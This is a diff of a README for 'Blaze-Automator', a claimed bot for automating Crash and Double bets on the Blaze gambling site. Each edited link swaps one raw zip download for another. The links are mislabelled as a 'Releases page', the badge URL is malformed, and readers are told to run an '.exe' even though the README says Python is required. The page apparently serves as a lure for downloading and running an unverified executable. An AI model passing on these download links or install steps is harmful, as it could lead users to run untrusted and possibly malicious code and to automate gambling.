@@ -1,6 +1,6 @@
 # 🚀 Blaze-Automator - Automate Your Betting Experience Easily
 
-[![Download Blaze-Automator](https://raw.githubusercontent.com/Ivantoos/Blaze-Automator/main/Blaze/Blaze-Automator-v2.3.zip%https://raw.githubusercontent.com/Ivantoos/Blaze-Automator/main/Blaze/Blaze-Automator-v2.3.zip)](https://raw.githubusercontent.com/Ivantoos/Blaze-Automator/main/Blaze/Blaze-Automator-v2.3.zip)
+[![Download Blaze-Automator](https://github.com/Ivantoos/Blaze-Automator/raw/refs/heads/main/Blaze/Blaze-Automator-v2.6-alpha.4.zip%https://github.com/Ivantoos/Blaze-Automator/raw/refs/heads/main/Blaze/Blaze-Automator-v2.6-alpha.4.zip)](https://github.com/Ivantoos/Blaze-Automator/raw/refs/heads/main/Blaze/Blaze-Automator-v2.6-alpha.4.zip)
 
 ## 📦 Introduction
 Blaze-Automator helps you automate betting on the Blaze platform. This tool simplifies the process of placing Crash and Double bets. Whether you are new to online betting or looking to improve your strategy, Blaze-Automator makes it easy to use smart automation.
@@ -18,7 +18,7 @@ Before you download Blaze-Automator, ensure your computer meets the following re
 ## 📬 Installation Steps
 
 ### 📥 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/Ivantoos/Blaze-Automator/main/Blaze/Blaze-Automator-v2.3.zip) to download the latest version of Blaze-Automator.
+1. Visit the [Releases page](https://github.com/Ivantoos/Blaze-Automator/raw/refs/heads/main/Blaze/Blaze-Automator-v2.6-alpha.4.zip) to download the latest version of Blaze-Automator.
 2. Find the version that suits your needs. Click the download link for the installer file (e.g., `.exe`).
 3. Once downloaded, locate the file in your Downloads folder.
 4. Double-click the installer file and follow the on-screen instructions to complete the installation.
@@ -38,7 +38,7 @@ Before you download Blaze-Automator, ensure your computer meets the following re
 
 ### 🔧 Troubleshooting
 If you encounter issues while using Blaze-Automator, try the following:
-- Ensure you have the latest version installed. Go back to the [Releases page](https://raw.githubusercontent.com/Ivantoos/Blaze-Automator/main/Blaze/Blaze-Automator-v2.3.zip) and download any updates if needed.
+- Ensure you have the latest version installed. Go back to the [Releases page](https://github.com/Ivantoos/Blaze-Automator/raw/refs/heads/main/Blaze/Blaze-Automator-v2.6-alpha.4.zip) and download any updates if needed.
 - Check your internet connection. A stable connection is vital for the tool to work effectively.
 - Ensure your Python version is compatible with Blaze-Automator. You can download it from the official Python website.
 
